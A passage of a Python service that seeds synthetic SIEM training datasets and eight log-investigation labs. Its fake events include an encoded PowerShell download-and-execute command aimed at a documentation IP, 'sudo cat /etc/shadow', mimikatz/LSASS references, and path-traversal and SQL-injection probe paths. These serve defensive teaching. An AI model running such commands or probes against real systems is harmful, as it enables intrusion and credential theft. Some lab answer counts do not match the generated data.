"""SIEM Dataset & Scenario Management Service for NexoraNet Step 15.

Generates realistic, strictly synthetic educational security datasets using RFC 5737
documentation IPs (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) and RFC 2606
domains (.test, example.test, nexoranet.test).
"""

import json
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any, ClassVar

from sqlalchemy import select
from sqlalchemy.orm import Session

from app.models.enums import (
    LogSourceStatus,
    LogSourceType,
    RawLogFormat,
    SecurityEventAction,
    SecurityEventCategory,
    SecurityEventSeverity,
    SecurityLogDatasetType,
)
from app.models.siem import (
    LogSource,
    RawLogEvent,
    SecurityEvent,
    SecurityLogDataset,
    SIEMLabScenario,
)
from app.services.siem.correlation_engine import SiemCorrelationEngine


class SiemDatasetService:
    """Manages pre-built synthetic SIEM datasets, sources, and educational labs."""

    STANDARD_SOURCES: ClassVar[list[dict[str, Any]]] = [
        {
            "stable_id": "SRC-WIN-SEC-01",
            "name": "Windows Domain Controller Security Log",
            "description": "Active Directory domain controller Windows Security Event log stream.",
            "source_type": LogSourceType.WINDOWS_SECURITY.value,
            "platform": "Windows Server 2022",
            "vendor": "Microsoft",
            "version": "10.0.20348",
        },
        {
            "stable_id": "SRC-WIN-SYS-01",
            "name": "Workstation System & Process Events",
            "description": "Windows workstation operational system, process creation, and service events.",
            "source_type": LogSourceType.WINDOWS_SYSTEM.value,
            "platform": "Windows 11 Enterprise",
            "vendor": "Microsoft",
            "version": "10.0.22631",
        },
        {
            "stable_id": "SRC-LNX-AUTH-01",
            "name": "Production Linux SSH & Auth Log",
            "description": "Authentication and authorization logs from core Linux server farm.",
            "source_type": LogSourceType.LINUX_AUTH.value,
            "platform": "Ubuntu Linux",
            "vendor": "Canonical",
            "version": "24.04 LTS",
        },
        {
            "stable_id": "SRC-LNX-SYS-01",
            "name": "Linux Core Syslog & Sudo Audit",
            "description": "General system log messages and administrative sudo command activity.",
            "source_type": LogSourceType.LINUX_SYSLOG.value,
            "platform": "Ubuntu Linux",
            "vendor": "Canonical",
            "version": "24.04 LTS",
        },
        {
            "stable_id": "SRC-NET-FW-01",
            "name": "Perimeter NextGen Firewall",
            "description": "Edge firewall traffic, dropped packets, and connection state logs.",
            "source_type": LogSourceType.FIREWALL.value,
            "platform": "Edge Gateway",
            "vendor": "Cisco",
            "version": "9.18",
        },
        {
            "stable_id": "SRC-NET-DNS-01",
            "name": "Internal Recursive DNS Server",
            "description": "DNS queries, resolution status, and lookup latency records.",
            "source_type": LogSourceType.DNS.value,
            "platform": "BIND DNS",
            "vendor": "ISC",
            "version": "9.18",
        },
        {
            "stable_id": "SRC-WEB-NGX-01",
            "name": "Customer Portal Nginx Web Server",
            "description": "Web server access logs capturing HTTP requests, paths, status codes, and user-agents.",
            "source_type": LogSourceType.WEB_SERVER.value,
            "platform": "Nginx Reverse Proxy",
            "vendor": "Nginx",
            "version": "1.24",
        },
    ]

    LAB_SCENARIOS: ClassVar[list[dict[str, Any]]] = [
        {
            "slug": "lab-siem-find-failed-logins",
            "title": "Lab 1 — Find Failed Logins (Authentication Triage)",
            "difficulty": "BEGINNER",
            "dataset_stable_id": "DS-AUTH-BEG-01",
            "description": "Learn how to query the SIEM to identify repeated login failures and uncover possible password spraying.",
            "objectives": json.dumps([
                "Filter events by action 'LOGIN_FAILURE'.",
                "Identify the usernames targeted by the failed login attempts.",
                "Determine the primary source IP address generating the login failures.",
            ]),
            "hints": json.dumps([
                "Use the Quick Filter 'Failed Logins' or build a condition action = 'LOGIN_FAILURE'.",
                "Inspect the username and source_ip columns in the search results.",
            ]),
            "recommended_query": json.dumps({
                "conditions": [{"field": "action", "operator": "=", "value": "LOGIN_FAILURE"}],
                "logical_op": "AND",
            }),
            "expected_event_count": 15,
        },
        {
            "slug": "lab-siem-identify-source-ip",
            "title": "Lab 2 — Identify Suspicious Source IP & Geographic Sweep",
            "difficulty": "BEGINNER",
            "dataset_stable_id": "DS-AUTH-BEG-01",
            "description": "Use SIEM aggregations to isolate the highest-frequency synthetic IP address and evaluate its activity.",
            "objectives": json.dumps([
                "Check the Top Source IPs widget on the SIEM dashboard.",
                "Filter events originating specifically from 198.51.100.45.",
                "Check whether any subsequent logins succeeded from that IP.",
            ]),
            "hints": json.dumps([
                "Add a condition source_ip = '198.51.100.45'.",
                "Sort by timestamp to analyze the progression of attempts.",
            ]),
            "recommended_query": json.dumps({
                "conditions": [{"field": "source_ip", "operator": "=", "value": "198.51.100.45"}],
                "logical_op": "AND",
            }),
            "expected_event_count": 20,
        },
        {
            "slug": "lab-siem-firewall-blocks",
            "title": "Lab 3 — Investigate Perimeter Firewall Blocks",
            "difficulty": "BEGINNER",
            "dataset_stable_id": "DS-NET-INT-01",
            "description": "Analyze firewall drop logs to spot port sweeping and unauthorized network probes.",
            "objectives": json.dumps([
                "Filter for firewall events with action 'CONNECTION_BLOCKED'.",
                "Identify which destination ports are being targeted (e.g. 22, 445, 3389).",
                "Determine if the source IP is attempting an internal network scan.",
            ]),
            "hints": json.dumps([
                "Use quick_filter 'FIREWALL_BLOCKS' or condition action = 'CONNECTION_BLOCKED'.",
                "Group or sort by destination_port to see the scanned ports.",
            ]),
            "recommended_query": json.dumps({
                "conditions": [{"field": "action", "operator": "=", "value": "CONNECTION_BLOCKED"}],
                "logical_op": "AND",
            }),
            "expected_event_count": 25,
        },
        {
            "slug": "lab-siem-dns-investigation",
            "title": "Lab 4 — DNS Anomaly & Exfiltration Analysis",
            "difficulty": "BEGINNER",
            "dataset_stable_id": "DS-NET-INT-01",
            "description": "Search DNS queries to detect anomalous lookups and potential covert DNS channels.",
            "objectives": json.dumps([
                "Query all events under the 'DNS' event_category.",
                "Identify high-frequency queries to suspicious domains ending in .test.",
                "Note any NXDOMAIN responses that indicate nonexistent subdomains.",
            ]),
            "hints": json.dumps([
                "Build condition: event_category = 'DNS' AND domain CONTAINS '.test'.",
            ]),
            "recommended_query": json.dumps({
                "conditions": [
                    {"field": "event_category", "operator": "=", "value": "DNS"},
                    {"field": "domain", "operator": "CONTAINS", "value": "tunnel"},
                ],
                "logical_op": "AND",
            }),
            "expected_event_count": 18,
        },
        {
            "slug": "lab-siem-event-correlation",
            "title": "Lab 5 — Multi-Source Event Correlation (Auth + Network)",
            "difficulty": "INTERMEDIATE",
            "dataset_stable_id": "DS-NET-INT-01",
            "description": "Correlate an authentication event with a concurrent network connection from the same synthetic host.",
            "objectives": json.dumps([
                "Find the workstation exhibiting both SSH logins and outbound web connections.",
                "Verify timestamps to determine whether the network connection occurred during or after the session.",
                "Correlate the destination IP with external indicators.",
            ]),
            "hints": json.dumps([
                "Search with text '192.0.2.105' across the dataset.",
                "Look at event types: linux_ssh_login_success and web_access.",
            ]),
            "recommended_query": json.dumps({
                "search_text": "192.0.2.105",
                "logical_op": "AND",
            }),
            "expected_event_count": 12,
        },
        {
            "slug": "lab-siem-web-error-investigation",
            "title": "Lab 6 — Web Server Reconnaissance & Probing",
            "difficulty": "INTERMEDIATE",
            "dataset_stable_id": "DS-NET-INT-01",
            "description": "Analyze Nginx web server access logs to uncover vulnerability scanners and directory traversal attempts.",
            "objectives": json.dumps([
                "Filter for event_category = 'WEB' and status = 'FAILURE'.",
                "Inspect URL paths requested (e.g. /wp-admin, /etc/passwd, /.env).",
                "Evaluate the User-Agent string to recognize automated scanners.",
            ]),
            "hints": json.dumps([
                "Use Quick Filter 'Web' and inspect event details drawer.",
            ]),
            "recommended_query": json.dumps({
                "conditions": [
                    {"field": "event_category", "operator": "=", "value": "WEB"},
                    {"field": "status", "operator": "=", "value": "FAILURE"},
                ],
                "logical_op": "AND",
            }),
            "expected_event_count": 20,
        },
        {
            "slug": "lab-siem-process-anomaly",
            "title": "Lab 7 — Host Process Anomaly & Living-off-the-Land",
            "difficulty": "ADVANCED",
            "dataset_stable_id": "DS-SOC-ADV-01",
            "description": "Detect suspicious process launches such as PowerShell encoded commands and administrative tool abuse.",
            "objectives": json.dumps([
                "Filter events under event_category = 'PROCESS'.",
                "Identify processes executing from temporary or suspicious paths.",
                "Trace parent-child process relationships (e.g., winword.exe -> powershell.exe).",
            ]),
            "hints": json.dumps([
                "Look for process_name CONTAINS 'powershell' or 'cmd'.",
                "Check the command_summary field for encoded flags or whoami execution.",
            ]),
            "recommended_query": json.dumps({
                "conditions": [
                    {"field": "event_category", "operator": "=", "value": "PROCESS"},
                    {"field": "severity", "operator": ">=", "value": "MEDIUM"},
                ],
                "logical_op": "AND",
            }),
            "expected_event_count": 15,
        },
        {
            "slug": "lab-siem-multi-stage-incident",
            "title": "Lab 8 — Full Cyber Kill Chain Timeline Reconstruction",
            "difficulty": "ADVANCED",
            "dataset_stable_id": "DS-SOC-ADV-01",
            "description": "Reconstruct a complete multi-stage cyber incident connecting web access, process creation, credential dump, and data exfiltration.",
            "objectives": json.dumps([
                "Step 1: Identify initial access vector in Web/DNS logs.",
                "Step 2: Trace execution in host process logs.",
                "Step 3: Document credential harvesting attempts.",
                "Step 4: Locate network beaconing and blocked exfiltration attempts.",
                "Step 5: Synthesize a complete chronological incident timeline.",
            ]),
            "hints": json.dumps([
                "Use the time series histogram to spot peaks across the dataset.",
                "Correlate the patient zero host 'WS-FINANCE-01.corp.test'.",
            ]),
            "recommended_query": json.dumps({
                "search_text": "WS-FINANCE-01",
                "logical_op": "AND",
            }),
            "expected_event_count": 35,
        },
    ]

    @classmethod
    def seed_all_siem_data(cls, db: Session) -> dict[str, Any]:
        """Idempotently seed standard log sources, 3 datasets, synthetic events, rules, and labs."""
        # 1. Sources
        sources_map = cls._seed_sources(db)

        # 2. Datasets & Events
        ds_auth = cls._seed_auth_dataset(db, sources_map)
        ds_net = cls._seed_network_dataset(db, sources_map)
        ds_adv = cls._seed_adv_dataset(db, sources_map)

        # 3. Correlation Rules
        SiemCorrelationEngine.seed_default_rules(db)

        # 4. Run Initial Correlation on datasets to synthesize alerts
        SiemCorrelationEngine.run_correlation(db, ds_auth.id)
        SiemCorrelationEngine.run_correlation(db, ds_net.id)
        SiemCorrelationEngine.run_correlation(db, ds_adv.id)

        # 5. Labs & Scenarios
        cls._seed_labs(db, {
            "DS-AUTH-BEG-01": ds_auth.id,
            "DS-NET-INT-01": ds_net.id,
            "DS-SOC-ADV-01": ds_adv.id,
        })

        return {
            "sources": len(sources_map),
            "datasets": [ds_auth.stable_id, ds_net.stable_id, ds_adv.stable_id],
            "total_events": (ds_auth.event_count or 0) + (ds_net.event_count or 0) + (ds_adv.event_count or 0),
        }

    @classmethod
    def _seed_sources(cls, db: Session) -> dict[str, LogSource]:
        """Seed log sources."""
        result: dict[str, LogSource] = {}
        for s_def in cls.STANDARD_SOURCES:
            src = db.execute(
                select(LogSource).where(LogSource.stable_id == s_def["stable_id"])
            ).scalar_one_or_none()
            if not src:
                src = LogSource(
                    stable_id=s_def["stable_id"],
                    name=s_def["name"],
                    description=s_def["description"],
                    source_type=s_def["source_type"],
                    platform=s_def["platform"],
                    vendor=s_def["vendor"],
                    version=s_def.get("version"),
                    status=LogSourceStatus.ACTIVE.value,
                    is_synthetic=True,
                )
                db.add(src)
                db.flush()
            result[s_def["stable_id"]] = src
        db.commit()
        return result

    @classmethod
    def _seed_auth_dataset(cls, db: Session, sources: dict[str, LogSource]) -> SecurityLogDataset:
        """Seed Dataset 1: Authentication Investigation — Beginner."""
        stable_id = "DS-AUTH-BEG-01"
        ds = db.execute(
            select(SecurityLogDataset).where(SecurityLogDataset.stable_id == stable_id)
        ).scalar_one_or_none()
        if ds:
            return ds

        base_time = datetime(2026, 9, 30, 8, 0, 0, tzinfo=timezone.utc)
        ds = SecurityLogDataset(
            stable_id=stable_id,
            name="Authentication Investigation — Beginner",
            description="Synthetic Windows and Linux authentication telemetry capturing successful logins, password sprays, account lockouts, and privileged sudo usage.",
            dataset_type=SecurityLogDatasetType.BEGINNER.value,
            difficulty="BEGINNER",
            event_count=0,
            start_time=base_time,
            end_time=base_time + timedelta(hours=4),
            is_synthetic=True,
        )
        db.add(ds)
        db.flush()

        events_to_create: list[dict[str, Any]] = []

        # 1. Normal morning logins (benign baseline)
        benign_users = ["alice.smith", "bob.jones", "charlie.brown", "dana.white", "elena.rostova"]
        for i, u in enumerate(benign_users):
            t = base_time + timedelta(minutes=i * 5)
            events_to_create.append({
                "timestamp": t,
                "event_type": "windows_logon_success",
                "event_category": SecurityEventCategory.AUTHENTICATION.value,
                "source_type": LogSourceType.WINDOWS_SECURITY.value,
                "source_id": sources["SRC-WIN-SEC-01"].id,
                "host": f"WS-{u.split('.')[0].upper()}-01.corp.test",
                "username": u,
                "source_ip": f"192.0.2.{50 + i}",
                "destination_ip": "192.0.2.10",
                "destination_port": 88,
                "protocol": "Kerberos",
                "action": SecurityEventAction.LOGIN.value,
                "status": "SUCCESS",
                "severity": SecurityEventSeverity.INFO.value,
                "result": "SUCCESS",
                "message": f"User {u} successfully authenticated to domain controller.",
                "raw_format": RawLogFormat.WINDOWS_EVENT_XML.value,
                "raw_message": f"<Event><System><EventID>4624</EventID><Computer>DC01.corp.test</Computer></System><EventData><Data Name='TargetUserName'>{u}</Data><Data Name='IpAddress'>192.0.2.{50 + i}</Data></EventData></Event>",
            })

        # 2. Password Spray / Brute Force Campaign from 198.51.100.45 (Attacker)
        spray_targets = ["admin", "administrator", "root", "service_account", "backup", "vpn_user", "guest", "test_user"]
        attack_start = base_time + timedelta(minutes=45)
        for i, target in enumerate(spray_targets * 2):  # 16 attempts
            t = attack_start + timedelta(seconds=i * 20)
            events_to_create.append({
                "timestamp": t,
                "event_type": "linux_ssh_login_failure",
                "event_category": SecurityEventCategory.AUTHENTICATION.value,
                "source_type": LogSourceType.LINUX_AUTH.value,
                "source_id": sources["SRC-LNX-AUTH-01"].id,
                "host": "auth-gateway-01.corp.test",
                "username": target,
                "source_ip": "198.51.100.45",
                "destination_ip": "192.0.2.15",
                "destination_port": 22,
                "protocol": "SSH",
                "action": SecurityEventAction.LOGIN_FAILURE.value,
                "status": "FAILURE",
                "severity": SecurityEventSeverity.LOW.value,
                "result": "FAILURE",
                "message": f"Failed password for invalid user {target} from 198.51.100.45 port {41000 + i} ssh2",
                "raw_format": RawLogFormat.SYSLOG.value,
                "raw_message": f"Sep 30 08:45:00 auth-gateway-01 sshd[1234]: Failed password for invalid user {target} from 198.51.100.45 port {41000 + i} ssh2",
            })

        # 3. Account lockout of target "service_account"
        lock_t = attack_start + timedelta(minutes=6)
        events_to_create.append({
            "timestamp": lock_t,
            "event_type": "windows_account_locked",
            "event_category": SecurityEventCategory.ACCOUNT.value,
            "source_type": LogSourceType.WINDOWS_SECURITY.value,
            "source_id": sources["SRC-WIN-SEC-01"].id,
            "host": "DC01.corp.test",
            "username": "service_account",
            "source_ip": "198.51.100.45",
            "destination_ip": "192.0.2.10",
            "action": SecurityEventAction.ACCOUNT_DISABLED.value,
            "status": "LOCKED",
            "severity": SecurityEventSeverity.HIGH.value,
            "result": "ACCOUNT_LOCKED",
            "message": "User account service_account was locked out due to exceeding maximum failed authentication attempts threshold.",
            "raw_format": RawLogFormat.WINDOWS_EVENT_XML.value,
            "raw_message": "<Event><System><EventID>4740</EventID><Computer>DC01.corp.test</Computer></System><EventData><Data Name='TargetUserName'>service_account</Data><Data Name='IpAddress'>198.51.100.45</Data></EventData></Event>",
        })

        # 4. Successful login from 198.51.100.45 (Compromise after spray)
        comp_t = lock_t + timedelta(minutes=2)
        events_to_create.append({
            "timestamp": comp_t,
            "event_type": "linux_ssh_login_success",
            "event_category": SecurityEventCategory.AUTHENTICATION.value,
            "source_type": LogSourceType.LINUX_AUTH.value,
            "source_id": sources["SRC-LNX-AUTH-01"].id,
            "host": "auth-gateway-01.corp.test",
            "username": "vpn_user",
            "source_ip": "198.51.100.45",
            "destination_ip": "192.0.2.15",
            "destination_port": 22,
            "protocol": "SSH",
            "action": SecurityEventAction.LOGIN.value,
            "status": "SUCCESS",
            "severity": SecurityEventSeverity.HIGH.value,
            "result": "SUCCESS",
            "message": "Accepted password for vpn_user from 198.51.100.45 port 42890 ssh2",
            "raw_format": RawLogFormat.SYSLOG.value,
            "raw_message": "Sep 30 08:53:00 auth-gateway-01 sshd[1299]: Accepted password for vpn_user from 198.51.100.45 port 42890 ssh2",
        })

        # 5. Sudo privilege execution
        sudo_t = comp_t + timedelta(minutes=3)
        events_to_create.append({
            "timestamp": sudo_t,
            "event_type": "linux_sudo_execution",
            "event_category": SecurityEventCategory.PRIVILEGE.value,
            "source_type": LogSourceType.LINUX_AUTH.value,
            "source_id": sources["SRC-LNX-AUTH-01"].id,
            "host": "auth-gateway-01.corp.test",
            "username": "vpn_user",
            "source_ip": "198.51.100.45",
            "action": SecurityEventAction.PRIVILEGE_CHANGE.value,
            "status": "SUCCESS",
            "severity": SecurityEventSeverity.MEDIUM.value,
            "command_summary": "sudo /usr/bin/cat /etc/shadow",
            "message": "vpn_user : TTY=pts/1 ; PWD=/home/vpn_user ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
            "raw_format": RawLogFormat.SYSLOG.value,
            "raw_message": "Sep 30 08:56:00 auth-gateway-01 sudo: vpn_user : TTY=pts/1 ; PWD=/home/vpn_user ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
        })

        # Commit events
        cls._insert_events(db, ds, events_to_create)
        return ds

    @classmethod
    def _seed_network_dataset(cls, db: Session, sources: dict[str, LogSource]) -> SecurityLogDataset:
        """Seed Dataset 2: Multi-Source Network Investigation — Intermediate."""
        stable_id = "DS-NET-INT-01"
        ds = db.execute(
            select(SecurityLogDataset).where(SecurityLogDataset.stable_id == stable_id)
        ).scalar_one_or_none()
        if ds:
            return ds

        base_time = datetime(2026, 9, 30, 10, 0, 0, tzinfo=timezone.utc)
        ds = SecurityLogDataset(
            stable_id=stable_id,
            name="Multi-Source Network Investigation — Intermediate",
            description="Correlated multi-source logs containing firewall port sweeps, covert DNS tunneling queries, web directory scanning, and host connections.",
            dataset_type=SecurityLogDatasetType.INTERMEDIATE.value,
            difficulty="INTERMEDIATE",
            event_count=0,
            start_time=base_time,
            end_time=base_time + timedelta(hours=3),
            is_synthetic=True,
        )
        db.add(ds)
        db.flush()

        events_to_create: list[dict[str, Any]] = []

        # 1. External Port Sweep against Perimeter Firewall
        scanner_ip = "203.0.113.88"
        target_ip = "192.0.2.1"
        ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 8080]
        for i, p in enumerate(ports):
            t = base_time + timedelta(seconds=i * 10)
            events_to_create.append({
                "timestamp": t,
                "event_type": "firewall_drop",
                "event_category": SecurityEventCategory.FIREWALL.value,
                "source_type": LogSourceType.FIREWALL.value,
                "source_id": sources["SRC-NET-FW-01"].id,
                "host": "fw-edge-01.corp.test",
                "source_ip": scanner_ip,
                "source_port": 45000 + i,
                "destination_ip": target_ip,
                "destination_port": p,
                "protocol": "TCP",
                "action": SecurityEventAction.CONNECTION_BLOCKED.value,
                "status": "BLOCKED",
                "severity": SecurityEventSeverity.LOW.value,
                "message": f"IPTABLES DROP: IN=eth0 OUT= SRC={scanner_ip} DST={target_ip} PROTO=TCP SPT={45000 + i} DPT={p}",
                "raw_format": RawLogFormat.SYSLOG.value,
                "raw_message": f"Sep 30 10:00:10 fw-edge-01 kernel: IPTABLES DROP: IN=eth0 OUT= SRC={scanner_ip} DST={target_ip} PROTO=TCP SPT={45000 + i} DPT={p}",
            })

        # 2. DNS Tunneling Burst
        c2_domain = "tunnel.exfil-c2.test"
        workstation_ip = "192.0.2.105"
        dns_start = base_time + timedelta(minutes=25)
        for i in range(12):
            t = dns_start + timedelta(seconds=i * 15)
            chunk = uuid.uuid4().hex[:16]
            query_name = f"{chunk}.{c2_domain}"
            events_to_create.append({
                "timestamp": t,
                "event_type": "dns_query_record",
                "event_category": SecurityEventCategory.DNS.value,
                "source_type": LogSourceType.DNS.value,
                "source_id": sources["SRC-NET-DNS-01"].id,
                "host": "dns-primary-01.corp.test",
                "source_ip": workstation_ip,
                "destination_ip": "192.0.2.2",
                "destination_port": 53,
                "protocol": "DNS",
                "action": SecurityEventAction.DNS_QUERY.value,
                "domain": query_name,
                "status": "NXDOMAIN" if i % 3 == 0 else "NOERROR",
                "severity": SecurityEventSeverity.MEDIUM.value if i % 3 == 0 else SecurityEventSeverity.INFO.value,
                "message": f"client {workstation_ip}#53120: query: {query_name} IN TXT + ({workstation_ip})",
                "raw_format": RawLogFormat.SYSLOG.value,
                "raw_message": f"Sep 30 10:25:00 dns-primary-01 named[982]: client {workstation_ip}#53120: query: {query_name} IN TXT + ({workstation_ip})",
            })

        # 3. Web Directory Traversal / Vulnerability Scanning
        web_scanner_ip = "198.51.100.99"
        probe_paths = [
            "/wp-login.php",
            "/.env",
            "/config.json",
            "/admin/dump.sql",
            "/../../etc/passwd",
            "/actuator/env",
            "/api/v1/users?id=1' OR '1'='1",
        ]
        web_start = base_time + timedelta(minutes=50)
        for i, path in enumerate(probe_paths):
            t = web_start + timedelta(seconds=i * 12)
            events_to_create.append({
                "timestamp": t,
                "event_type": "web_access_log",
                "event_category": SecurityEventCategory.WEB.value,
                "source_type": LogSourceType.WEB_SERVER.value,
                "source_id": sources["SRC-WEB-NGX-01"].id,
                "host": "portal.nexoranet.test",
                "source_ip": web_scanner_ip,
                "destination_ip": "192.0.2.80",
                "destination_port": 443,
                "protocol": "HTTP",
                "action": SecurityEventAction.CONNECTION.value,
                "status": "FAILURE",
                "severity": SecurityEventSeverity.LOW.value,
                "url": path,
                "message": f'{web_scanner_ip} - - [{t.strftime("%d/%b/%Y:%H:%M:%S")}] "GET {path} HTTP/1.1" 404 162 "-" "curl/7.88.1"',
                "raw_format": RawLogFormat.SYSLOG.value,
                "raw_message": f'{web_scanner_ip} - - [{t.strftime("%d/%b/%Y:%H:%M:%S")}] "GET {path} HTTP/1.1" 404 162 "-" "curl/7.88.1"',
            })

        cls._insert_events(db, ds, events_to_create)
        return ds

    @classmethod
    def _seed_adv_dataset(cls, db: Session, sources: dict[str, LogSource]) -> SecurityLogDataset:
        """Seed Dataset 3: Advanced SOC Log Investigation."""
        stable_id = "DS-SOC-ADV-01"
        ds = db.execute(
            select(SecurityLogDataset).where(SecurityLogDataset.stable_id == stable_id)
        ).scalar_one_or_none()
        if ds:
            return ds

        base_time = datetime(2026, 9, 30, 13, 0, 0, tzinfo=timezone.utc)
        ds = SecurityLogDataset(
            stable_id=stable_id,
            name="Advanced SOC Log Investigation",
            description="Comprehensive cyber incident telemetry tracking initial phishing link execution, PowerShell beaconing, credential dumping, lateral movement, and data staging.",
            dataset_type=SecurityLogDatasetType.ADVANCED.value,
            difficulty="ADVANCED",
            event_count=0,
            start_time=base_time,
            end_time=base_time + timedelta(hours=5),
            is_synthetic=True,
        )
        db.add(ds)
        db.flush()

        events_to_create: list[dict[str, Any]] = []

        # Stage 1: Phishing Link Click & Initial Payload Stager
        p0_host = "WS-FINANCE-01.corp.test"
        p0_user = "linda.finance"
        p0_ip = "192.0.2.140"
        c2_ip = "198.51.100.120"
        t_stage1 = base_time + timedelta(minutes=10)

        events_to_create.append({
            "timestamp": t_stage1,
            "event_type": "web_access_download",
            "event_category": SecurityEventCategory.WEB.value,
            "source_type": LogSourceType.WEB_SERVER.value,
            "source_id": sources["SRC-WEB-NGX-01"].id,
            "host": p0_host,
            "username": p0_user,
            "source_ip": p0_ip,
            "destination_ip": c2_ip,
            "destination_port": 80,
            "protocol": "HTTP",
            "action": SecurityEventAction.CONNECTION.value,
            "domain": "invoice-portal.payment-review.test",
            "url": "http://invoice-portal.payment-review.test/invoices/doc_49102.zip",
            "status": "SUCCESS",
            "severity": SecurityEventSeverity.MEDIUM.value,
            "message": f"User {p0_user} downloaded zip archive from untrusted domain invoice-portal.payment-review.test",
            "raw_format": RawLogFormat.JSON.value,
            "raw_message": json.dumps({"client": p0_ip, "user": p0_user, "action": "download", "url": "http://invoice-portal.payment-review.test/invoices/doc_49102.zip"}),
        })

        # Stage 2: Suspicious Process Execution (PowerShell Living-off-the-Land)
        t_stage2 = t_stage1 + timedelta(minutes=3)
        events_to_create.append({
            "timestamp": t_stage2,
            "event_type": "windows_process_creation",
            "event_category": SecurityEventCategory.PROCESS.value,
            "source_type": LogSourceType.WINDOWS_SYSTEM.value,
            "source_id": sources["SRC-WIN-SYS-01"].id,
            "host": p0_host,
            "username": p0_user,
            "process_name": "powershell.exe",
            "parent_process": "winword.exe",
            "command_summary": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADEAMgAwAC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkA",
            "action": SecurityEventAction.PROCESS_START.value,
            "status": "SUCCESS",
            "severity": SecurityEventSeverity.CRITICAL.value,
            "message": f"Process powershell.exe spawned by winword.exe with encoded bypass execution flags on {p0_host}",
            "raw_format": RawLogFormat.WINDOWS_EVENT_XML.value,
            "raw_message": f"<Event><System><EventID>4688</EventID><Computer>{p0_host}</Computer></System><EventData><Data Name='NewProcessName'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='ParentProcessName'>C:\\Program Files\\Microsoft Office\\root\\Office16\\winword.exe</Data></EventData></Event>",
        })

        # Stage 3: Reconnaissance (whoami & net view)
        for i, cmd in enumerate(["whoami /all", "net group \"Domain Admins\" /domain", "ipconfig /all"]):
            t_cmd = t_stage2 + timedelta(seconds=30 * (i + 1))
            events_to_create.append({
                "timestamp": t_cmd,
                "event_type": "windows_process_creation",
                "event_category": SecurityEventCategory.PROCESS.value,
                "source_type": LogSourceType.WINDOWS_SYSTEM.value,
                "source_id": sources["SRC-WIN-SYS-01"].id,
                "host": p0_host,
                "username": p0_user,
                "process_name": cmd.split()[0] + ".exe",
                "parent_process": "powershell.exe",
                "command_summary": cmd,
                "action": SecurityEventAction.PROCESS_START.value,
                "status": "SUCCESS",
                "severity": SecurityEventSeverity.MEDIUM.value,
                "message": f"Execution of reconnaissance utility: {cmd} on {p0_host}",
                "raw_format": RawLogFormat.WINDOWS_EVENT_XML.value,
                "raw_message": f"<Event><System><EventID>4688</EventID><Computer>{p0_host}</Computer></System><EventData><Data Name='NewProcessName'>{cmd.split()[0]}.exe</Data><Data Name='CommandLine'>{cmd}</Data></EventData></Event>",
            })

        # Stage 4: Credential Dumping (LSASS access attempt)
        t_stage4 = t_stage2 + timedelta(minutes=5)
        events_to_create.append({
            "timestamp": t_stage4,
            "event_type": "windows_defender_alert",
            "event_category": SecurityEventCategory.MALWARE_ALERT.value,
            "source_type": LogSourceType.WINDOWS_DEFENDER.value,
            "source_id": sources["SRC-WIN-SYS-01"].id,
            "host": p0_host,
            "username": "SYSTEM",
            "action": SecurityEventAction.CONNECTION_BLOCKED.value,
            "status": "QUARANTINED",
            "severity": SecurityEventSeverity.CRITICAL.value,
            "file_name": "mimikatz.exe",
            "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "message": "Windows Defender blocked untrusted memory dump request against LSASS process (Behavior:Win32/CredentialStealer)",
            "raw_format": RawLogFormat.JSON.value,
            "raw_message": json.dumps({"signature": "Behavior:Win32/CredentialStealer", "target": "lsass.exe", "host": p0_host, "action": "blocked"}),
        })

        # Stage 5: Lateral Movement attempt via SMB to File Server
        t_stage5 = t_stage4 + timedelta(minutes=8)
        events_to_create.append({
            "timestamp": t_stage5,
            "event_type": "firewall_flow_smb",
            "event_category": SecurityEventCategory.NETWORK.value,
            "source_type": LogSourceType.FIREWALL.value,
            "source_id": sources["SRC-NET-FW-01"].id,
            "host": "fw-edge-01.corp.test",
            "source_ip": p0_ip,
            "destination_ip": "192.0.2.200",  # File server
            "destination_port": 445,
            "protocol": "SMB",
            "action": SecurityEventAction.CONNECTION.value,
            "status": "ALLOWED",
            "severity": SecurityEventSeverity.HIGH.value,
            "message": f"Inbound SMB session from {p0_ip} to sensitive storage server 192.0.2.200:445",
            "raw_format": RawLogFormat.SYSLOG.value,
            "raw_message": f"Sep 30 13:26:00 fw-edge-01 kernel: IPTABLES ALLOW: SRC={p0_ip} DST=192.0.2.200 PROTO=TCP SPT=49812 DPT=445",
        })

        cls._insert_events(db, ds, events_to_create)
        return ds

    @classmethod
    def _insert_events(
        cls, db: Session, ds: SecurityLogDataset, event_defs: list[dict[str, Any]]
    ) -> None:
        """Batch insert raw logs and normalized security events."""
        min_ts = ds.start_time
        max_ts = ds.end_time

        seq = ds.event_count or 0
        for ed in event_defs:
            seq += 1
            ts: datetime = ed["timestamp"]
            if min_ts is None or ts < min_ts:
                min_ts = ts
            if max_ts is None or ts > max_ts:
                max_ts = ts

            raw_ev = RawLogEvent(
                source_id=ed.get("source_id"),
                dataset_id=ds.id,
                timestamp=ts,
                raw_message=ed.get("raw_message", ed.get("message", "Synthetic log message")),
                format=ed.get("raw_format", RawLogFormat.JSON.value),
                sequence_number=seq,
            )
            db.add(raw_ev)
            db.flush()

            event_code = f"EVT-SIEM-{uuid.uuid4().hex[:10].upper()}"
            sec_ev = SecurityEvent(
                event_id=event_code,
                timestamp=ts,
                event_type=ed["event_type"],
                event_category=ed["event_category"],
                source_type=ed["source_type"],
                host=ed.get("host"),
                username=ed.get("username"),
                source_ip=ed.get("source_ip"),
                source_port=ed.get("source_port"),
                destination_ip=ed.get("destination_ip"),
                destination_port=ed.get("destination_port"),
                protocol=ed.get("protocol"),
                action=ed.get("action"),
                status=ed.get("status"),
                severity=ed.get("severity", "INFO"),
